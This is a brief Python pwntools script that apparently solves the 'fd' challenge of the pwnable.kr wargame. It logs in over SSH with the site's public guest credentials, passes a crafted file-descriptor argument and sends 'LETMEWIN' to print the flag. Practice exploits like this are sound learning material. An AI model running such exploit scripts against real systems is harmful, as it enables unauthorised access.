from pwn import *

s = ssh(
  user='fd',
  host='pwnable.kr',
  port=2222,
  password='guest'
)

rem = s.process(['./fd', str(int(0x1234))])
rem.sendline(b"LETMEWIN")
rem.recvline()
print(rem.recvline())